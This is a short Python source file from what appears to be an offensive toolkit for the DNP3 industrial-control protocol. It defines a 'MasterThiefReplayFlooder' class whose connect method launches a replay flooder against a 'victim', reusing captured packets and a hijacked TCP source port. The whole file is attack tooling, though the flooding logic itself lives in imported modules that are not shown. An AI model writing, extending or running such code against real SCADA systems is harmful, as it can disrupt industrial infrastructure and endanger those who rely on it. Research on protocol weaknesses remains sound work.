from nltk.classify.rte_classify import ne
from DNP3_Replay_flooder import DNP3_Replay_Flooder

__author__ = 'Nicholas Rodofile'

from master_thief_replay import *
from DNP3_Replay_flooder import *
from DNP3_Node import *
from scapy.all import IP, TCP

class MasterThiefReplayFlooder(MasterThiefReplay):
    def __init__(self, victim, pcap):
        MasterThiefReplay.__init__(self, victim, pcap)

    def connect(self):
        if not self.running_master:
            self.running_master = True
            self.master = DNP3_Replay_Flooder(self.victim, self.injection[TCP].sport, self.pcap)
            self.master.address_conf(self.injection[DNP3])
            self.master.start()
